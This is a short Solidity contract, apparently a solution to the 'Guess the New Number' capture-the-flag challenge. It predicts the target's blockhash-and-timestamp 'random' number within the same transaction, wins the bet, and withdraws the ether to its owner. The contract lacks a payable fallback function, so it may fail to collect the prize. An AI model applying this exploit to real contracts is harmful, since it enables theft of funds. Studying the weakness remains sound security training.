/**
 *Submitted for verification at Etherscan.io on 2021-04-26
*/

pragma solidity ^0.4.21;


contract GuessTheNewNumberChallengeInterface
{
    function guess(uint8 n) public payable;
}

// call contract with good value

// method to get the ether back
contract GuessTheNewNumberChallengeCaller 
{
  
    address public owner;
    function GuessTheNewNumberChallengeCaller() public payable {
        owner = msg.sender;
       
    }

    function callContract(address addr) public payable
    {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        GuessTheNewNumberChallengeInterface c = GuessTheNewNumberChallengeInterface(addr);
        // should send 2 ethers to the contract
        c.guess.value(msg.value)(answer);
        
    }

    function withdraw() public
    {
        require(msg.sender == owner);
        owner.transfer(address(this).balance);

    }
}